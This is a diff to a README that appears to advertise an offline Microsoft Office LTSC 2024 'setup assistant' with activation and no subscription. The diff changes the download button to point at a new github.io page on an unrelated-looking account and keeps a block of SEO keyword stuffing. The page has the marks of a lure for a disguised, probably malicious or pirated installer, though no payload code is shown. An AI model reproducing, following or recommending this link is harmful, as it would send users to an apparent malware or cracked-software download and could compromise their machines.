@@ -2,7 +2,7 @@
 
 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://picpick-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/MicrosoftOffice)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
@@ -25,7 +25,7 @@ Designed for large-scale rollout and offline activation, this setup assistant en
 
 🖼 Preview  
 ![Office LTSC 2024 Screenshot](https://i.ytimg.com/vi/oK-LLtBuqbo/maxresdefault.jpg)  
-*Microsoft Office LTSC 2024 — Word interface*
+
 
 🔍 SEO Keywords  
 office ltsc 2024 offline, office enterprise setup, ms office 2024 no login, office no subscription, office airgapped deployment, office 2024 installer offline, office suite LTSC, office 2024 secure rollout, office for education offline, office gov install, office GPO setup, office 2024 without cloud, offline MS Word Excel PowerPoint, office suite 2024 activation, office without telemetry, office batch installer, office for internal IT, ms office secure mode, office full version offline, ms office without Microsoft account, office volume deployment, office activation assistant, office non-cloud edition, LTSC office ISO install, office 2024 classroom edition
